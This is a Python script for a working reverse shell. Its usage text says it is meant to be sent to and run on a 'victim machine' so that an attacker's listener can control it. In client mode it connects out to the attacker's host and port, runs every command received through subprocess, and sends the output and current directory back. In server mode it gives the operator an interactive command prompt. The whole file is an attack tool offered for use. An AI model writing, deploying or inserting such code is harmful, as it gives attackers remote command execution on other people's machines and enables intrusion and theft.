import socket
import os
import subprocess
import sys
import getopt


#server_host = sys.argv[1]
#port = int(sys.argv[2])
buffer_size = 1024 * 1024
separator = "<sep>"
listen = False
target = ""
port = 0

s = socket.socket()

def usage():
    print('''reverse shell create with python you need to send this script
    to the victim machine. This script helps to manipulate the victim machine but you need send and execute form the the machine

    Commands
    -h --help     -Show this information
    -t --target   -Configure the machine which will take the control
    -l --listen   -Configure the attaker machine
    -p --port     -Configure the port which listen the commands''')
    sys.exit(0)

def main():

    
    global server_host
    global port
    global buffer_size 
    global separator
    global listen
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hlt:p:", ["help","listen","target","port"])

    except getopt.GetoptError as err:
        print (str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False

    if not listen and len(target) and port > 0:
        client(buffer_size, target, port)

    if listen and len(target) and port > 0:
        server(buffer_size, port, target)

    # print(port)
    # print(listen)


def client(BUFFER_SIZE,server_ip,port):
    s.connect((server_ip, port))


    # get the current directory
    cwd = os.getcwd()
    s.send(cwd.encode())


    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = output + separator + cwd
        s.send(message.encode())
    # close client connection
    s.close()


def server(buffer_size,port,target):
    
   # def get_ip():
   #     h_name = socket.gethostname()
   #     IP_addres = socket.gethostbyname(h_name)
   #     return IP_addres

    s.bind((target, port))

    s.listen(5)

    print("Listening as " + target +  ":" +  str(port) +  " ...")

    client_socket, client_address = s.accept()

    print(client_address[0] +  ":" + str(client_address[1]) +  " Connected!")

    cwd = client_socket.recv(buffer_size).decode()
    print("[+] Current working directory:", cwd)

    while True:
        # get the command from prompt
        command = input(cwd + " $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = client_socket.recv(buffer_size).decode()
        # split command output and current directory
        results, cwd = output.split(separator)
        # print output
        print(results)



main()

